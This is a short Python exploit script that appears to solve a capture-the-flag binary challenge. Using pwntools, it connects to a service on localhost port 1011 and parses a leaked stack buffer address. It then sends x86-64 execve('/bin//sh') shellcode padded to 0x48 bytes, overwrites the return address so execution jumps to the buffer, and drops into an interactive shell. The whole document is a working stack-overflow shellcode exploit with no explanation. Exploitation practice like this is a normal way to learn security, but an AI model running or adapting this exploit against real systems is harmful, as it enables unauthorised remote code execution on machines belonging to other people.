from pwn import *

p = remote("localhost", 1011)
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

p.recvuntil(": ")
buf_addr = int(p.recv(14), 16)

pay = shellcode
pay += 'a' * (0x48 - len(pay))
pay += p64(buf_addr)

p.sendline(pay)
p.interactive()
